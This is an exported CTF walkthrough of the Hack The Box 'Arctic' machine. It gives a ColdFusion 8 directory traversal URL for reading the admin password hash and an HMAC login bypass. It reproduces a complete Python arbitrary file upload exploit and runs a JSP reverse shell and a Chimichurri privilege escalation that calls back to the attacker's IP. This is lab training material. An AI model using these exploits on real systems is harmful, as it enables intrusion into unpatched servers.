<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
<title>Arctic</title>
<meta content="CherryTree" name="generator"/>
<link href="styles.css" rel="stylesheet" type="text/css"/>
</head>
<body><div class="main"><div class="tree">
<p><a href="../HacktheBox--Windows_Boxes.html">Windows Boxes</a></p>
<p><a href="#Arctic">Arctic</a></p>
<ol>
<li><a href="#nmap">nmap</a></li>
<li><a href="#enumeration">enumeration</a></li>
<ol>
<li><a href="#/CFIDE">/CFIDE</a></li>
<ol>
<li><a href="#/administrator">/administrator</a></li>
</ol>
</ol>
<li><a href="#intitial foothold">intitial foothold</a></li>
<ol>
<li><a href="#with metasploit">with metasploit</a></li>
<ol>
<li><a href="#localhost proxy listener">localhost proxy listener</a></li>
<li><a href="#fckeditor reverseshell">fckeditor reverseshell</a></li>
</ol>
<li><a href="#w/o metasploit">w/o metasploit</a></li>
<ol>
<li><a href="#searchsploit">searchsploit</a></li>
<li><a href="#directory traversal (LFI)">directory traversal (LFI)</a></li>
<ol>
<li><a href="#admin pass">admin pass</a></li>
<ol>
<li><a href="#Crackstation">Crackstation</a></li>
</ol>
<li><a href="#pagesource">pagesource</a></li>
<li><a href="#webpage console">webpage console</a></li>
<ol>
<li><a href="#admin">admin</a></li>
</ol>
</ol>
<li><a href="#reverse shell through file upload">reverse shell through file upload</a></li>
<ol>
<li><a href="#scheduling a task">scheduling a task</a></li>
</ol>
<li><a href="#arrexel reverse shell">arrexel reverse shell</a></li>
<ol>
<li><a href="#arbitrary file upload by arrexel">arbitrary file upload by arrexel</a></li>
<ol>
<li><a href="#exploit">exploit</a></li>
<li><a href="#vi arrexel_exploit.py">vi arrexel_exploit.py</a></li>
<li><a href="#jsp generated payload w/ msfvenom">jsp generated payload w/ msfvenom</a></li>
<li><a href="#run">run</a></li>
</ol>
</ol>
</ol>
</ol>
<li><a href="#privesc">privesc</a></li>
<ol>
<li><a href="#windows exploit suggester">windows exploit suggester</a></li>
<ol>
<li><a href="#sysinfo">sysinfo</a></li>
<li><a href="#report">report</a></li>
</ol>
<li><a href="#ms10-059 -&gt; chimichurri">ms10-059 -&gt; chimichurri</a></li>
<ol>
<li><a href="#upload with arrexel's file uploader">upload with arrexel's file uploader</a></li>
<li><a href="#run">run</a></li>
</ol>
</ol>
<li><a href="#user/root">user/root</a></li>
<li><a href="#Lessons Learned">Lessons Learned</a></li>
</ol></div>
<div class="page" id="Arctic"><h1><b><u>Arctic</u></b></h1><img alt="images/45-1.png" src="images/45-1.png"/><br/><img alt="images/45-2.png" src="images/45-2.png"/><br/></div>
<div class="page" id="nmap"><h1><b><u>nmap</u></b></h1><img alt="images/46-1.png" src="images/46-1.png"/><br/><span style="color:#24ff00;">Making note of the services running:</span><br/><span style="color:#24ff00;">Ports </span><span style="color:#ffa500;">135</span><span style="color:#24ff00;"> &amp; </span><span style="color:#ffa500;">49154</span><span style="color:#24ff00;">: running </span><span style="color:#ffa500;">Microsoft Windows RPC</span><span style="color:#24ff00;">. (SMB)<br/>Port </span><span style="color:#ffa500;">8500</span><span style="color:#24ff00;">: possibly running </span><span style="color:#ffa500;">Flight Message Transfer Protocol</span><span style="color:#24ff00;"> (FMTP).</span><br/><br/></div>
<div class="page" id="enumeration"><h1><b><u>enumeration</u></b></h1><span style="color:#24ff00;">lets start off our enumeration phase by visiting port </span><span style="color:#ffa500;">8500</span><br/><img alt="images/727-1.png" src="images/727-1.png"/><br/></div>
<div class="page" id="/CFIDE"><h1><b><u>/CFIDE</u></b></h1><img alt="images/729-1.png" src="images/729-1.png"/><br/><br/><img alt="images/729-2.png" src="images/729-2.png"/> is an interesting <span style="color:#24ff00;">directory</span>, lets navigate to that first</div>
<div class="page" id="/administrator"><h1><b><u>/administrator</u></b></h1><span style="color:#24ff00;">we see we get a login page </span><img alt="images/730-1.png" src="images/730-1.png"/> is the version of <span style="color:#ffa500;">coldfusion</span><span style="color:#24ff00;"> the server is running, lets see if theres anything </span><span style="color:#ffa500;">searchsploit</span><span style="color:#24ff00;"> has on it...<br/><br/></span><img alt="images/730-2.png" src="images/730-2.png"/></div>
<div class="page" id="intitial foothold"><h1><b><u>intitial foothold</u></b></h1><img alt="images/734-1.png" src="images/734-1.png"/><br/><span style="color:#24ff00;">Lets fire up searchsploit for Coldfusion 8 vulns<br/></span><img alt="images/734-2.png" src="images/734-2.png"/><br/><br/>After reviewing the exploits, two of them stand out:<br/><span style="color:#ffa500;">14641</span> <span style="color:#24ff00;">— </span><span style="color:#ffa500;">Directory Traversal</span><span style="color:#24ff00;">. We’ll use that to get the password of the administrator.<br/></span><span style="color:#ffa500;">45979</span><span style="color:#24ff00;"> — </span><span style="color:#ffa500;">Arbitrary file Upload</span><span style="color:#24ff00;">. We’ll use that to get a reverse shell on the target machine.</span></div>
<div class="page" id="with metasploit"><h1><b><u>with metasploit</u></b></h1><span style="color:#ffa500;">localhost proxy listener<br/>fckeditor reverseshell</span></div>
<div class="page" id="localhost proxy listener"><h1><b><u>localhost proxy listener</u></b></h1><span style="color:#24ff00;">First set up a </span><span style="color:#ffa500;">proxy listener </span><span style="color:#24ff00;">in burp so we can capture the packets of our </span><span style="color:#ffa500;">coldfusion</span><span style="color:#24ff00;"> exploit as we launch it</span><br/><br/><img alt="images/49-1.png" src="images/49-1.png"/></div>
<div class="page" id="fckeditor reverseshell"><h1><b><u>fckeditor reverseshell</u></b></h1><img alt="images/47-1.png" src="images/47-1.png"/><br/><br/><span style="color:#24ff00;">run the exploit to catch the request through </span><span style="color:#ffa500;">burpsuite</span><span style="color:#24ff00;"> and send to </span><span style="color:#ffa500;">repeater</span><br/><img alt="images/47-2.png" src="images/47-2.png"/><br/><br/><span style="color:#24ff00;">we see our exploit successfully uploaded our reverse shell and saved it in the directory </span><span style="color:#ffa500;">/userfiles/file/YI.jsp</span><span style="color:#24ff00;">, we can navigate to that URL in our browser to run it</span><br/><img alt="images/47-3.png" src="images/47-3.png"/><br/><img alt="images/47-4.png" src="images/47-4.png"/><br/><br/><span style="color:#24ff00;">when we navigate to the </span><span style="color:#ffa500;">jsp</span><span style="color:#24ff00;"> file we uploaded we run our reverse shell </span><br/><img alt="images/47-5.png" src="images/47-5.png"/><br/><br/><br/><br/></div>
<div class="page" id="w/o metasploit"><h1><b><u>w/o metasploit</u></b></h1><span style="color:#ffa500;">searchsploit<br/>directory traversal LFI<br/></span></div>
<div class="page" id="searchsploit"><h1><b><u>searchsploit</u></b></h1><span style="color:#24ff00;">searchsploit adobe coldfusion version 8 and see what comes up:<br/><br/>we're only interested in version 8 and before...<br/></span><img alt="images/732-1.png" src="images/732-1.png"/><br/><br/>After reviewing the exploits, two of them stand out:<br/><span style="color:#ffa500;">14641</span><span style="color:#24ff00;"> — </span><span style="color:#ffa500;">Directory Traversal</span><span style="color:#24ff00;">. We’ll use that to get the password of the administrator.<br/></span><span style="color:#ffa500;">45979</span><span style="color:#24ff00;"> —</span><span style="color:#ffa500;"> Arbitrary file Upload</span><span style="color:#24ff00;">. We’ll use that to get a reverse shell on the target machine.</span></div>
<div class="page" id="directory traversal (LFI)"><h1><b><u>directory traversal (LFI)</u></b></h1><span style="color:#24ff00;">Lets take a look at the directory traversal exploit and see how it works:<br/><br/></span><img alt="images/733-1.png" src="images/733-1.png"/><br/><br/>we don't need to run the exploit, we can plug the directory traversal url into our browser<br/><img alt="images/733-2.png" src="images/733-2.png"/><br/><br/><span style="color:#24ff00;">to this url<br/></span><img alt="images/733-3.png" src="images/733-3.png"/><br/>or <span style="color:#ffa500;">http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en</span> <span style="color:#24ff00;">for the arctic box</span><br/><br/><br/><span style="color:#24ff00;">there are additional notes from the sourcecode in case we run into blocked directories:</span><br/><img alt="images/733-4.png" src="images/733-4.png"/></div>
<div class="page" id="admin pass"><h1><b><u>admin pass</u></b></h1><span style="color:#24ff00;">the password </span><img alt="images/735-1.png" src="images/735-1.png"/> is outputted onto the screen!<br/><br/><span style="color:#ffff00;">2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03</span><br/><img alt="images/735-2.png" src="images/735-2.png"/></div>
<div class="page" id="Crackstation"><h1><b><u>Crackstation</u></b></h1><span style="color:#24ff00;">we can also use </span><span style="color:#ffa500;">crackstation</span><span style="color:#24ff00;"> to uncover the hash:<br/></span><img alt="images/738-1.png" src="images/738-1.png"/><br/><span style="color:#ffff00;">happyday</span><span style="color:#24ff00;"> is our password BUT it will not work as the admin page only takes the salted hash</span></div>
<div class="page" id="pagesource"><h1><b><u>pagesource</u></b></h1><span style="color:#24ff00;">Right click on the page and select View Page Source. There, we find three pieces of important information on the steps taken to send the password to the backend.<br/><br/>1) The password is taken from the password field and hashed using SHA1. This is done on the client side.<br/>2) Then the hashed password is HMAC-ed using a salt value taken from the parameter salt field. This is also done on the client side.<br/>3) The HMAC-ed password gets sent to the server with the salt value. There, I’m assuming the server verifies that the hashed password was HMAC-ed with the correct salt value.<br/><br/></span><img alt="images/736-1.png" src="images/736-1.png"/><br/><br/>the password <img alt="images/736-2.png" src="images/736-2.png"/> is a hash of the real password<br/><br/>Therefore, instead of cracking the password (which can take a long time!) we can calculate the cfadminPassword.value and use an intercepting proxy to bypass the client side calculation.<br/></div>
<div class="page" id="webpage console"><h1><b><u>webpage console</u></b></h1><span style="color:#24ff00;">To quickly calculate the cfadminPassword value use the Console in your browser Developer Tools to run the following JS code.<br/><br/></span><span style="color:#ffa500;">console.log(hex_hmac_sha1(document.loginform.salt.value, ‘2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03'’))</span><br/><img alt="images/737-1.png" src="images/737-1.png"/><br/><img alt="images/737-2.png" src="images/737-2.png"/><br/>now lets intercept the login packet with <span style="color:#ffa500;">burpsuite</span><span style="color:#24ff00;"> and plug this value into </span><strong><span style="color:#24ff00;">cfadminPassword</span></strong><span style="color:#24ff00;">:<br/><br/></span><strong><span style="color:#24ff00;">Note</span></strong><span style="color:#24ff00;">: we only have a </span><span style="color:#ffff00;">30-second</span><span style="color:#24ff00;"> window to enter this hash before the salt updates so be quick! If you miss the timing you can generate the new salted hash either way and keep trying<br/></span><img alt="images/737-3.png" src="images/737-3.png"/></div>
<div class="page" id="admin"><h1><b><u>admin</u></b></h1><span style="color:#24ff00;">a few botched attempts and regenerated hashes and </span><span style="color:#ffff00;">WE'RE IN</span><span style="color:#24ff00;">!</span><br/><br/><img alt="images/739-1.png" src="images/739-1.png"/></div>
<div class="page" id="reverse shell through file upload"><h1><b><u>reverse shell through file upload</u></b></h1><span style="color:#24ff00;">If we take a look at the </span><span style="color:#ffff00;">admin capabilities</span>,<span style="color:#24ff00;"> under the</span><span style="color:#ffa500;"> debugging and logging tab</span> <span style="color:#24ff00;">we can see we have the ability to </span><span style="color:#ffff00;">schedule</span><span style="color:#24ff00;"> a task to be run, lets take a closer look at this<br/><br/></span><img alt="images/740-1.png" src="images/740-1.png"/></div>
<div class="page" id="scheduling a task"><h1><b><u>scheduling a task</u></b></h1><img alt="images/741-1.png" src="images/741-1.png"/><span style="color:#24ff00;"><br/>from here upload our </span><span style="color:#ffa500;">msfvenom jsp reverse shell </span><span style="color:#24ff00;">and schedule it to run as often as possible, then set up a listener and connect back<br/><br/>To be continued...use arrexel's reverse shell for now</span></div>
<div class="page" id="arrexel reverse shell"><h1><b><u>arrexel reverse shell</u></b></h1><h1>A fellow hacker and htb enthusist named arrexel also uploaded an arbitrary file upload in his arctic writeup also, I want to use his exploit to gain a foothold on the box as well</h1></div>
<div class="page" id="arbitrary file upload by arrexel"><h1><b><u>arbitrary file upload by arrexel</u></b></h1><img alt="images/742-1.png" src="images/742-1.png"/><br/><img alt="images/742-2.png" src="images/742-2.png"/><br/><img alt="images/742-3.png" src="images/742-3.png"/><br/><br/></div>
<div class="page" id="exploit"><h1><b><u>exploit</u></b></h1><div class = "codebox"><div style="background-color: #001b33; padding: 10px; border: 1px solid green;">#!/usr/bin/python<br/># Exploit Title: ColdFusion 8.0.1 - Arbitrary File Upload<br/># Date: 2017-10-16<br/># Exploit Author: Alexander Reid<br/># Vendor Homepage: <a href="http://www.adobe.com/products/coldfusion-family.html">http://www.adobe.com/products/coldfusion-family.html</a><h3><br/># Version: ColdFusion 8.0.1<br/># CVE: CVE-2009-2265 <br/># <br/># Description: <br/># A standalone proof of concept that demonstrates an arbitrary file upload vulnerability in ColdFusion 8.0.1<br/># Uploads the specified jsp file to the remote server.<br/>#<br/># Usage: ./exploit.py &lt;target ip&gt; &lt;target port&gt; [/path/to/coldfusion] &lt;/path/to/payload.jsp&gt;<br/># Example: ./exploit.py 127.0.0.1 8500 /home/arrexel/shell.jsp<br/>import requests, sys<br/><br/>try:<br/>    ip = sys.argv[1]<br/>    port = sys.argv[2]<br/>    if len(sys.argv) == 5:<br/>        path = sys.argv[3]<br/>        with open(sys.argv[4], 'r') as payload:<br/>            body=payload.read()<br/>    else:<br/>        path = ""<br/>        with open(sys.argv[3], 'r') as payload:<br/>            body=payload.read()<br/>except IndexError:<br/>    print 'Usage: ./exploit.py &lt;target ip/hostname&gt; &lt;target port&gt; [/path/to/coldfusion] &lt;/path/to/payload.jsp&gt;'<br/>    print 'Example: ./exploit.py example.com 8500 /home/arrexel/shell.jsp'<br/>    sys.exit(-1)<br/><br/>basepath = "</h3><a "="" href="http://">http://"</a><h3> + ip + ":" + port + path<br/><br/>print 'Sending payload...'<br/><br/>try:<br/>    req = requests.post(basepath + "/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&amp;Type=File&amp;CurrentFolder=/exploit.jsp%00", files={'newfile': ('exploit.txt', body, 'application/x-java-archive')}, timeout=30)<br/>    if req.status_code == 200:<br/>        print 'Successfully uploaded payload!\nFind it at ' + basepath + '/userfiles/file/exploit.jsp'<br/>    else:<br/>        print 'Failed to upload payload... ' + str(req.status_code) + ' ' + req.reason<br/>except requests.Timeout:<br/>    print 'Failed to upload payload... Request timed out'</h3></div></div></h3></div>
<div class="page" id="vi arrexel_exploit.py"><h1><b><u>vi arrexel_exploit.py</u></b></h1><span style="color:#24ff00;">Copy and paste arrexel's code into a vi file we create and give it execute permissions:<br/><br/></span><img alt="images/746-1.png" src="images/746-1.png"/><br/><img alt="images/746-2.png" src="images/746-2.png"/><br/><img alt="images/746-3.png" src="images/746-3.png"/><br/><br/><br/></div>
<div class="page" id="jsp generated payload w/ msfvenom"><h1><b><u>jsp generated payload w/ msfvenom</u></b></h1>we'll use the <strong><span style="color:#ffa500;">/java/jsp_shell_reverse_tcp</span></strong> payload to connect back to our attacking machine<br/><br/><img alt="images/744-1.png" src="images/744-1.png"/></div>
<div class="page" id="run"><h1><b><u>run</u></b></h1><span style="color:#24ff00;">usage: </span><img alt="images/747-1.png" src="images/747-1.png"/><br/><br/>so we'll use <span style="color:#ffa500;">python arrexel_exploit.py 10.10.10.11:8500 shell.jsp</span> <span style="color:#24ff00;">and set up a listener<br/><br/></span><img alt="images/747-2.png" src="images/747-2.png"/><br/><br/>lets navigate to the URL specified and...<br/><br/><img alt="images/747-3.png" src="images/747-3.png"/><br/><br/><img alt="images/747-4.png" src="images/747-4.png"/><br/><img alt="images/747-5.png" src="images/747-5.png"/><br/></div>
<div class="page" id="privesc"><h1><b><u>privesc</u></b></h1><span style="color:#ffa500;">windows exploit suggester <br/>ms01-059 -&gt; chimichurri</span></div>
<div class="page" id="windows exploit suggester"><h1><b><u>windows exploit suggester</u></b></h1><span style="color:#24ff00;">to run windows exploit suggester on our box, we have to first get the system info and copy it to a file on our attack machine<br/><br/>first lets update the database<br/></span><img alt="images/751-1.png" src="images/751-1.png"/><br/><br/>copy the box's <span style="color:#ffa500;">systeminfo</span><span style="color:#24ff00;"> from our reverse shell and save it into a sysinfo text file<br/></span><img alt="images/751-2.png" src="images/751-2.png"/><br/><br/>now run the suggester with the updated database file and the sysinfo txt file<br/><img alt="images/751-3.png" src="images/751-3.png"/><br/><br/><img alt="images/751-4.png" src="images/751-4.png"/>oof, have to update the xlrd library, lets do that<br/><br/><span style="color:#ffa500;">pip install xlrd</span><br/><img alt="images/751-5.png" src="images/751-5.png"/><br/><br/>lets try again... success!<br/><img alt="images/751-6.png" src="images/751-6.png"/><br/></div>
<div class="page" id="sysinfo"><h1><b><u>sysinfo</u></b></h1><span style="color:#24ff00;">save this to our </span><span style="color:#ffa500;">sysinfo</span><span style="color:#24ff00;"> textfile:</span><br/><br/><img alt="images/749-1.png" src="images/749-1.png"/></div>
<div class="page" id="report"><h1><b><u>report</u></b></h1><span style="color:#ffa500;">./windows-exploit-suggester.py --database 2020-05-28-mssb.xls --systeminfo /root/Documents/htb/boxes/arctic/sysinfo</span><br/><br/><img alt="images/752-1.png" src="images/752-1.png"/><br/><br/></div>
<div class="page" id="ms10-059 -&gt; chimichurri"><h1><b><u>ms10-059 -&gt; chimichurri</u></b></h1><span style="color:#24ff00;">a bunch of exploits work here but lets try one I know works<br/><br/></span><img alt="images/753-1.png" src="images/753-1.png"/><br/>save it and move it to our working directory<br/><br/><img alt="images/753-2.png" src="images/753-2.png"/><br/><img alt="images/753-3.png" src="images/753-3.png"/><br/><br/><br/><img alt="images/753-4.png" src="images/753-4.png"/><br/><img alt="images/753-5.png" src="images/753-5.png"/><br/></div>
<div class="page" id="upload with arrexel's file uploader"><h1><b><u>upload with arrexel's file uploader</u></b></h1><span style="color:#24ff00;">first we need to update </span><span style="color:#ffff00;">arrexel's</span><span style="color:#24ff00;"> exploit to handle exe files instead of jsp<br/><br/></span><img alt="images/754-1.png" src="images/754-1.png"/><br/>to:<br/><img alt="images/754-2.png" src="images/754-2.png"/><br/><br/><br/><span style="color:#24ff00;">lets run it again</span><br/><span style="color:#ffa500;">python arrexel_exploit_exe.py 10.10.10.11 8500 MS10-059.exe</span><br/><img alt="images/754-3.png" src="images/754-3.png"/><br/><br/><span style="color:#24ff00;">it uploads to the following directory on arctic:</span><br/><span style="color:#ffa500;">cd C:\ColdFusion8\wwwroot\userfiles\file</span><br/><br/><br/></div>
<div class="page" id="run"><h1><b><u>run</u></b></h1><span style="color:#24ff00;">Finally, lets run the privesc program from our initial foothold<br/><br/></span><img alt="images/755-1.png" src="images/755-1.png"/><br/>run <span style="color:#ffa500;">chimichurri</span><span style="color:#24ff00;"> (exploit.exe) and have it point back to our attacking machine</span><br/><br/><span style="color:#ffa500;">exploit.exe 10.10.14.62 6666</span><br/><img alt="images/755-2.png" src="images/755-2.png"/><br/><br/><span style="color:#ffa500;">look back to our listener and ...<br/></span><img alt="images/755-3.png" src="images/755-3.png"/><br/>we are <span style="color:#ffff00;">nt authority\system</span><span style="color:#ffa500;">!<br/></span></div>
<div class="page" id="user/root"><h1><b><u>user/root</u></b></h1><img alt="images/748-1.png" src="images/748-1.png"/><span style="color:#ffff00;"><br/>02650d3a69a70780c302e146a6cb96f3<br/><br/></span><img alt="images/748-2.png" src="images/748-2.png"/><br/>ce65ceee66b2b5ebaff07e50508ffb90</div>
<div class="page" id="Lessons Learned"><h1><b><u>Lessons Learned</u></b></h1><span style="color:#24ff00;">Check out Rana Khalil's OSCP writeups and prep at</span> <a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/</a><br/><img alt="images/1450-1.png" src="images/1450-1.png"/></div>
</div></body></html>